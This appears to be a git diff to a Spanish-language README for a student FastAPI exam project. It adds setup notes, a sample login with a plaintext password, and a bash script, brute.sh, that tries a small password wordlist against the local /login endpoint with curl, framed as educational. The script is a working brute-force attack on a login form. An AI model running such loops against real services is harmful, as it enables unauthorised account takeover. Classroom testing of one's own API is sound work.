@@ -26,6 +26,7 @@ practical-term-exam/
 
 - **Python** 3.10+  
 - **pip**
+- **(Windows) Git Bash or WSL to run brute.sh**
 
 Se recomienda crear un entorno virtual:
 
@@ -45,7 +46,9 @@ Desde la raíz del proyecto, con el entorno virtual activado:
 uvicorn main:app --reload --host 0.0.0.0 --port 8000
 ```
 La API quedará accesible en: http://127.0.0.1:8000/
-/n**ENDPOINTS DETECTADOS**
+
+## ENDPOINTS DETECTADOS
+
 - `GET /`  
   Root
 
@@ -66,3 +69,50 @@ La API quedará accesible en: http://127.0.0.1:8000/
 
 - `POST /login`  
   Login con `username` + `password`
+  
+  ## Ejemplo de login (body JSON)
+
+```json
+{ "username": "matias", "password": "matym123" }
+````
+## Respuesta satisfactoria actual
+```json
+{ "message": "login successful" }
+```
+## Respuesta por credenciales inválidas
+```json
+{ "message": "Invalid credentials" }
+```
+## Bruteforce / Script de prueba (`brute.sh`)
+
+> **Advertencia:** Este script fue utilizado unicamente con fines educativos, hacer el mismo proceso con equipos de terceros seria considerado algo ilegal
+
+### Versión original (la que viene en el repo)
+
+```bash
+API="http://127.0.0.1:8000/login"
+USER="matias"
+
+WORDLIST=(matym123 hola123 adios546 arroz123 pollo123 loco456 hello123 maty123)
+
+attempts=0
+start=$(date +%s)
+
+for pwd in "${WORDLIST[@]}"; do
+  attempts=$((attempts+1))
+  resp=$(curl -s -X POST "$API" \
+    -H "accept: application/json" \
+    -H "Content-Type: application/json" \
+    -d "{\"username\":\"$USER\",\"password\":\"$pwd\"}")
+  echo "[$attempts] Probando '$pwd' -> $resp"
+  if [[ "$resp" == *"login successful"* ]]; then
+    end=$(date +%s)
+    echo "ENCONTRADA: password='$pwd' en $attempts intentos, $((end-start))s"
+    exit 0
+  fi
+  sleep 0.2
+done
+
+end=$(date +%s)
+echo "NO encontrada tras $attempts intentos en $((end-start))s"
+exit 1
